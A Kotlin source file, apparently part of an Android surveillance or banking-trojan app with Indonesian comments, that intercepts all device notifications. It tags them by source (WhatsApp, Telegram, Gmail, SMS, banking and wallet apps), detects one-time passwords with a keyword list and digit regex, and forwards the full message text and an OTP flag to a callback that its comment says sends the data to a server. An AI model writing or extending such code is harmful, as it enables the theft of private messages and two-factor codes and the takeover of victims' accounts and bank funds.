package com.template.app

import android.util.Log
import org.json.JSONObject

object NotificationInterceptor {

    private const val TAG = "NotifInterceptor"

    // Callback ke NativeCommandHandler untuk kirim ke server
    var onNotificationReceived: ((JSONObject) -> Unit)? = null

    // ==========================================
    // ===== HANDLE NOTIFICATION =====
    // ==========================================
    fun onNotification(packageName: String, title: String, content: String) {
        try {
            Log.d(TAG, "📩 Notif: $packageName | $title | $content")

            val category = categorize(packageName)

            val payload = JSONObject().apply {
                put("package", packageName)
                put("title", title)
                put("body", content)
                put("category", category)
                put("timestamp", System.currentTimeMillis())
            }

            // Khusus OTP — log detail
            if (isOTP(title, content)) {
                Log.d(TAG, "🔐 OTP DETECTED: $content")
                payload.put("is_otp", true)
            }

            // Forward ke callback
            onNotificationReceived?.invoke(payload)
        } catch (e: Exception) {
            Log.e(TAG, "onNotification error", e)
        }
    }

    // ==========================================
    // ===== CATEGORIZE =====
    // ==========================================
    private fun categorize(packageName: String): String {
        val pkg = packageName.lowercase()
        return when {
            pkg.contains("whatsapp") -> "WA"
            pkg.contains("telegram") -> "TELE"
            pkg.contains("facebook") || pkg.contains("orca") -> "FB"
            pkg.contains("instagram") -> "IG"
            pkg.contains("android.gm") || pkg.contains("gmail") -> "GMAIL"
            pkg.contains("messaging") || pkg.contains("mms") -> "SMS"
            pkg.contains("phone") || pkg.contains("dialer") -> "PHONE"
            pkg.contains("bank") || pkg.contains("wallet") -> "BANK"
            else -> "OTHER"
        }
    }

    // ==========================================
    // ===== DETECT OTP =====
    // ==========================================
    private fun isOTP(title: String, content: String): Boolean {
        val text = "$title $content".lowercase()
        val otpKeywords = listOf(
            "otp", "kode", "verifikasi", "verification",
            "code", "pin", "password", "verification code",
            "security code", "autentikasi",
        )
        return otpKeywords.any { text.contains(it) } &&
                Regex("\\d{4,8}").containsMatchIn(text)
    }
}
